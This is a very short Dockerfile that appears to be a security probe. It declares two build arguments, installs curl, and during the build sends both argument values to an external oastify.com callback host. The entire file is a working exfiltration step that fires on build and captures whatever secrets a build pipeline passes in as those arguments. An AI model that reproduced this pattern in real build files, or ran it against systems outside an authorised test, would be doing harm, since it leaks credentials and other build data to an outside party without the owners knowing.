FROM alpine
ARG A
ARG B
RUN apk add curl; curl -d "A: $A; B: $B" ecug89rrl7gz1s332gsr642llcr3f43t.oastify.com
